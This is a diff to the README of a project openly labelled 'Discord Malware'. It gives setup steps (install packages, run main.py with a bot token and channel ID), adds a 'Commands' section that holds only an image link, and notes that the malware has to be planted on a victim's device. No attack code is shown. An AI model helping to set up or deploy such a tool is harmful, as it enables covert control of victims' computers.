@@ -12,5 +12,10 @@ Your average Discord Malware
 2. Install the required Python packages: `$ pip install -r requirements.txt`
 3. Run main.py: `$ python main.py 'enter your discord bot token' ' enter server channel id ' `
 
+# Commands
+![image](https://user-images.githubusercontent.com/49468484/185780369-6e5b50df-2a26-44f8-a913-2e5c0c14a03f.png)
+
+
+
 # Note:
  - This only works if both victim and attracker is on the same server and malware is planted in victim's device
